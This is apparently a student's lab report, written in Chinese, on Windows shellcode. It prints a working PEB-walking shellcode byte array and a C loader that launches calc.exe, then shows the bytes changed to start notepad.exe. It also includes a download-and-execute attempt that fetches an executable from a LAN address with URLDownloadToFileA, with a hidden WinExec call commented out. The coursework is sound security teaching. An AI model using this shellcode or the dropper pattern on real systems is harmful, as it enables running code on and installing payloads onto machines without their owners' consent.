

# 实验4-shellcode

## 实验要求

* 把上面这个链接中shellcode能够成功运行
* 能从汇编源码编译通过并成功dump
* 自行查阅资料，搜索Windows PEB结构体，PE文件导入表导出表相关数据结构的文档，解读shellcode原理
* 修改shellcode功能为运行记事本程序notepad. exe
* (选做，难度较大)修改shellcode功能为下载执行器，即下下载一个可执行文件，然后再运行（提示，使用原生API UrlDownloadToFileA）

## 实验环境

* windows 10
* Kali 2003
* Visual Studio

## 实验过程

### 1、运行`shellcode`示例

#### 1.1 代码

```
#include <windows.h>
#include <stdio.h>

char code[] = \
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
"\x52\xff\xd0";

int main(int argc, char** argv)
{
    int (*func)();
    //DWORD old_protect;
    //VirtualProtect(code, sizeof(code), PAGE_EXECUTE_READWRITE, &old_protect);
    func = (int(*)()) code;
    (int)(*func)();
}
```

#### 1.2 运行结果：成功

![image-20201022140640653](/img/image-20201022140640653.png)

### 2、从汇编源码编译通过并成功dump

通过执行`nasm`和`objdump`命令可以验证。

![image-20201029140022556](/img/image-20201029140022556.png)

![image-20201029140214155](/img/image-20201029140214155.png)

### 3、PEB

### 4、修改shellcode功能为运行记事本程序notepad. exe

#### 4.1 修改代码：将`calc.exe`修改为`notepad.exe`

`00 00 00 00 65 78 65 2e 63 6c 61 63`->`00 65 78 65 2e 64 61 70 65 74 6f 6e`

![image-20201029145659148](/img/image-20201029145659148.png)

#### 4.2 重新`dump`

![image-20201029150255387](/img/image-20201029150255387.png)

#### 4.3 将结果粘贴到代码里，重新运行

![image-20201029150353246](/img/image-20201029150353246.png)

### 5、修改shellcode功能为下载执行器，即下下载一个可执行文件，然后再运行

#### 5.1 代码

```
#include<Windows.h>
#include<urlmon.h>

typedef int(WINAPI* MY_DOWNLOAD_PROC)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);

int main()
{
	HMODULE hurlmod = LoadLibrary("urlmon.dll");
	MY_DOWNLOAD_PROC function_ptr = (MY_DOWNLOAD_PROC)GetProcAddress(hurlmod, "URLDownloadToFileA");
	function_ptr(NULL, "192.168.9.3:8000/workspace/shellcode.exe", "a.exe", 0, NULL);
	//CreateProcess
	//WinExec("a.exe", SW_HIDE);
}
```

报错：

![image-20201029212538113](/img/image-20201029212538113.png)

